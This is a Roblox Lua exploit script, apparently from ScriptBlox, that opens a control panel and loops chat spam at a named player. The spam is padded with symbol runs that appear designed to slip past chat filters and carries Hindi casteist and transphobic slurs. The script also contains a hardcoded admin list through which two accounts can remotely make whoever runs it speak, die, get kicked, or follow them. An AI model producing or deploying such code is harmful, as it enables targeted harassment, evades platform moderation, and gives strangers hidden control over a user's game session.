--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- ANIL V1: CODED BY ANIL | #AKJ
-- ADMINS: akj20095

local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local tcs = game:GetService("TextChatService")
local run = game:GetService("RunService")
local tele = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

-- 1. Configuration
local ADMINS = {
    ["akj20095"] = true,
    ["Tmkx"] = true
}

local active = false
local index = 1
local patternIndex = 1
local waitTime = 1.4

-- Command states
local dancing = false
local spinning = false
local following = nil

-- 2. THUMBNAIL BYPASS (Logo Image)
local logoImage = "rbxthumb://type=Asset&id=98781884734925&w=420&h=420"

-- 3. UI Setup
local old = lp.PlayerGui:FindFirstChild("ANIL_V1")
if old then old:Destroy() end

local sg = Instance.new("ScreenGui", lp.PlayerGui)
sg.Name = "ANIL_V1"
sg.ResetOnSpawn = false

local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(0, 400, 0, 300) -- Increased frame size
frame.Position = UDim2.new(0.5, -200, 0.4, -150)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BorderSizePixel = 3
frame.Active = true
frame.Draggable = true

-- Rainbow Border
task.spawn(function()
	while task.wait(0.05) do
		if frame then
			frame.BorderColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
		end
	end
end)

-- Header
local header = Instance.new("TextLabel", frame)
header.Size = UDim2.new(1, 0, 0, 35)
header.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
header.Text = "ANIL BYPASS"
header.TextColor3 = Color3.new(1, 0.8, 0)
header.Font = Enum.Font.FredokaOne
header.TextSize = 22

-- CENTER LOGO (NEW)
local logo = Instance.new("ImageLabel", frame)
logo.Size = UDim2.new(0, 120, 0, 120) -- Increased logo size
logo.Position = UDim2.new(0.5, -60, 0, 50)
logo.BackgroundTransparency = 1
logo.Image = logoImage
logo.ZIndex = 10

-- Text
local sub1 = Instance.new("TextLabel", frame)
sub1.Size = UDim2.new(0.6, 0, 0, 25)
sub1.Position = UDim2.new(0.2, 0, 0.55, 0)
sub1.Text = "Coded by ANIL"
sub1.TextColor3 = Color3.new(1, 1, 1)
sub1.BackgroundTransparency = 1
sub1.TextSize = 18

local sub2 = Instance.new("TextLabel", frame)
sub2.Size = UDim2.new(0.6, 0, 0, 30)
sub2.Position = UDim2.new(0.2, 0, 0.62, 0)
sub2.Text = "#AKJBAAP"
sub2.TextColor3 = Color3.fromRGB(255, 0, 0)
sub2.BackgroundTransparency = 1
sub2.Font = Enum.Font.SourceSansBold
sub2.TextSize = 28 -- Increased text size

-- Input
local input = Instance.new("TextBox", frame)
input.Size = UDim2.new(0.8, 0, 0, 30)
input.Position = UDim2.new(0.1, 0, 0.75, 0)
input.Text = "ANIL H8TERS"
input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
input.TextColor3 = Color3.new(1, 1, 1)

-- Buttons
local startBtn = Instance.new("TextButton", frame)
startBtn.Size = UDim2.new(0.35, 0, 0, 30)
startBtn.Position = UDim2.new(0.1, 0, 0.85, 0)
startBtn.Text = "START"
startBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
startBtn.TextColor3 = Color3.new(1, 1, 1)

local stopBtn = Instance.new("TextButton", frame)
stopBtn.Size = UDim2.new(0.35, 0, 0, 30)
stopBtn.Position = UDim2.new(0.55, 0, 0.85, 0)
stopBtn.Text = "STOP"
stopBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
stopBtn.TextColor3 = Color3.new(1, 1, 1)

-- Minimize Button
local minBtn = Instance.new("TextButton", frame)
minBtn.Size = UDim2.new(0, 30, 0, 30)
minBtn.Position = UDim2.new(1, -35, 0, 5)
minBtn.Text = "_"
minBtn.TextColor3 = Color3.new(1,1,1)
minBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
minBtn.Font = Enum.Font.SourceSansBold
minBtn.TextSize = 22

local minimized = false
local function toggleMinimize()
	minimized = not minimized
	if minimized then
		for _, v in pairs(frame:GetChildren()) do
			if v ~= header and v ~= minBtn then
				v.Visible = false
			end
		end
		frame.Size = UDim2.new(0, 400, 0, 35)
	else
		for _, v in pairs(frame:GetChildren()) do
			v.Visible = true
		end
		frame.Size = UDim2.new(0, 400, 0, 300)
	end
end

minBtn.MouseButton1Click:Connect(toggleMinimize)

-- Key sequence ANIL BAAP
local keySequence = {"A","N","I","L","B","A","A","P"}
local seqIndex = 1

UserInputService.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.UserInputType == Enum.UserInputType.Keyboard then
		local key = input.KeyCode.Name:upper()
		if key == keySequence[seqIndex] then
			seqIndex = seqIndex + 1
			if seqIndex > #keySequence then
				toggleMinimize()
				seqIndex = 1
			end
		else
			seqIndex = 1
		end
	end
end)

-- 4. Engine
local function send(msg, isPattern)
	if not msg then return end
	local finalMsg = msg

	if isPattern then
		local patterns = {"@", "#-", "@#"}
		local p = patterns[patternIndex]
		finalMsg = string.rep(p, math.floor(175 / #p)) .. "." .. msg
		patternIndex = (patternIndex >= #patterns) and 1 or (patternIndex + 1)
	end

	pcall(function()
		local chat = tcs:FindFirstChild("RBXGeneral", true)
			or (tcs:FindFirstChild("TextChannels") and tcs.TextChannels:FindFirstChild("RBXGeneral"))

		if chat then
			chat:SendAsync(finalMsg)
		else
			local legacy = rs:FindFirstChild("SayMessageRequest", true)
				or rs:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
			if legacy then
				legacy:FireServer(finalMsg, "All")
			end
		end
	end)
end

-- 5. Command Logic
local function handleCmd(text, sender)
	local raw = text:lower()
	local char = lp.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")

	if raw:sub(1,5) == "!say " then
		send(text:sub(6), false)

	elseif raw == "!sit" then
		if hum then hum.Sit = true end

	elseif raw:sub(1,7) == "!start " then
		input.Text = text:sub(8)
		active = true

	elseif raw == "!stop" then
		active = false

	elseif raw == "!kill" then
		if hum then hum.Health = 0 end

	elseif raw == "!rj" then
		tele:Teleport(game.PlaceId, lp)

	elseif raw == "!bring" then
		if char and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			char:MoveTo(sender.Character.HumanoidRootPart.Position)
		end

	elseif raw == "!cmds" then
		send("!start, !stop, !say, !sit, !kill, !rj, !bring, !follow, !unfollow, !speed, !view, !unview, !dance, !spin, !kick", false)

	elseif raw == "!dance" then
		dancing = not dancing
		spinning = false

	elseif raw == "!spin" then
		spinning = not spinning
		dancing = false

	elseif raw == "!follow" then
		following = sender.Name

	elseif raw == "!unfollow" then
		following = nil

	elseif raw:sub(1,7) == "!speed " then
		waitTime = tonumber(raw:sub(8)) or 1.4

	elseif raw == "!view" then
		if sender.Character and sender.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = sender.Character.Humanoid
		end

	elseif raw == "!unview" then
		if lp.Character and lp.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
		end

	elseif raw:sub(1,6) == "!kick " then
		local target = raw:sub(7):gsub("%s+", "")
		if target == lp.Name:lower() then
			lp:Kick("ANIL KICK")
		end
	end
end

-- 6. Listeners
for _, p in pairs(game.Players:GetPlayers()) do
	p.Chatted:Connect(function(m)
		if ADMINS[p.Name] then handleCmd(m, p) end
	end)
end

game.Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(m)
		if ADMINS[p.Name] then handleCmd(m, p) end
	end)
end)

-- 7. Movement Loop
run.RenderStepped:Connect(function()
	if not lp.Character then return end
	local root = lp.Character:FindFirstChild("HumanoidRootPart")
	if not root then return end

	if dancing then
		root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(math.sin(tick() * 10) * 5), 0)
	end

	if spinning then
		root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(20), 0)
	end

	if following and game.Players:FindFirstChild(following) then
		local t = game.Players[following].Character
		if t and t:FindFirstChild("HumanoidRootPart") then
			lp.Character.Humanoid:MoveTo(t.HumanoidRootPart.Position + Vector3.new(3,0,3))
		end
	end
end)

-- 8. Spam Loop
task.spawn(function()
	local phrases = {
		"Tmkx lola","Tmkx rudyyy","Tmkx sai","Tmkx hijraa",
	         "Tmkx ghanta","Tmkx bhangi","Tmkx chakka","Tmkx ethiopia","ANIL PAPA HAIN"
	}

	while true do
		if active then
			send(tostring(input.Text) .. " " .. phrases[index], true)
			if phrases[index] == "ANIL PAPA" then
				task.wait(5)
			else
				task.wait(waitTime)
			end
			index = (index >= #phrases) and 1 or (index + 1)
		end
		task.wait(0.1)
	end
end)

startBtn.MouseButton1Click:Connect(function() active = true end)
stopBtn.MouseButton1Click:Connect(function() active = false end)
